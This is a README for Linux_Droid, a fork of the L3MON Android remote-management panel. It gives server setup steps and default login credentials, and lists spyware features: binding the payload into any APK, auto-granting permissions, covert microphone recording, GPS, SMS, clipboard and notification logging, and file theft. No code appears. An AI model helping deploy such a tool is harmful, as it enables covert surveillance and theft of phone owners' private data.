<p align="center">
<img src="https://github.com/Linux-Droid/Linux_Droid/blob/master/assets/webpublic/logo.png" height="60"><br>
A cloud based remote android managment suite, powered by NodeJS
</p>



## Features

- Auto Allow Permission
- Device Administrator Manually
- Easy Bind Any Apk
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Built In APK Builder
## Prerequisites 
 - Java Runtime Environment 8
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server
## Installation ON Heroku [Click Here](https://github.com/Linux-Droid/Linux_Droid/blob/herooku/README.md)

## Installation ON VPS & PC
   Video Tutorial For VPS And PC [Click Here](https://t.me/Linux_Droid)
1. Install JRE 8 
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-8-jre`
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.8.0-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`

4. Download and Extract [HERE](https://codeload.github.com/Linux-Droid/Linux_Droid/zip/master)

5. In the extracted folder, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the Linux_Droid
    - `pm2 startup` <- to run Linux_Droid on startup

6. Default Username & Password. [You Can Check login_info.txt File]
    - Username: Linux
    - Password: Droid
    
7. Set Username & Password Manually  
    1. Stop Linux_Droid `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    4. save the file
    5. run `pm2 restart all`

8. in your browser navigate to `http://<SERVER IP>:22533`
    
It's recommended to run Linux_Droid behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)

## Happy Hacking
## Disclaimer
<b>Linux_Droid Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
Linux_Droid is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">Made with ❤️ By <a href="https://t.me/Linux_Droid">Linux_Droid</a></p>

## Credits

<b> Credits to <a href="https://github.com/D3VL">D3VL</a> for the original code base this repository is based on at <a href="https://github.com/D3VL/L3MON">L3MON</a>